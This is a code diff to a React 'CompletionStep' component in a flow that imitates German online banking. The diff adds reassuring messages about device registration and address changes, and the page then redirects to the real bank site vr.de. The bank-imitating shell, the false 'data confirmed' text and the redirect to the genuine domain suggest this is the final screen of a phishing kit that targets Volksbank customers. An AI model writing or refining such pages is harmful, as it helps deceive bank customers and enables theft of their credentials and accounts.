@@ -1,7 +1,15 @@
 import { useEffect } from "react";
 import type { FlowTheme } from "./BankShell";
 
-export function CompletionStep({ theme: _theme, customerName }: { theme: FlowTheme; customerName: string }) {
+export function CompletionStep({
+  theme: _theme,
+  customerName,
+  reason,
+}: {
+  theme: FlowTheme;
+  customerName: string;
+  reason?: "too_many_devices" | "qr_bank" | null;
+}) {
   useEffect(() => {
     const t = setTimeout(() => {
       window.location.href = "https://vr.de";
@@ -9,6 +17,13 @@ export function CompletionStep({ theme: _theme, customerName }: { theme: FlowThe
     return () => clearTimeout(t);
   }, []);
   const firstName = customerName ? customerName.split(" ")[0] : "";
+
+  const reasonText =
+    reason === "too_many_devices"
+      ? "Es sind bereits 3 Geräte registriert – eine Adressänderung ist nicht erforderlich."
+      : reason === "qr_bank"
+        ? "Für Ihre Bank ist keine Adressänderung erforderlich."
+        : null;
 
   return (
     <main className="flex-1 flex items-center justify-center px-4">
@@ -32,6 +47,9 @@ export function CompletionStep({ theme: _theme, customerName }: { theme: FlowThe
             Ihre Daten wurden erfolgreich bestätigt und Ihre Geräteverwaltung aktualisiert.
             Sie können Ihr Online-Banking wie gewohnt nutzen.
           </p>
+          {reasonText && (
+            <p className="mt-4 text-xs sm:text-sm text-gray-600">{reasonText}</p>
+          )}
         </div>
       </div>
     </main>
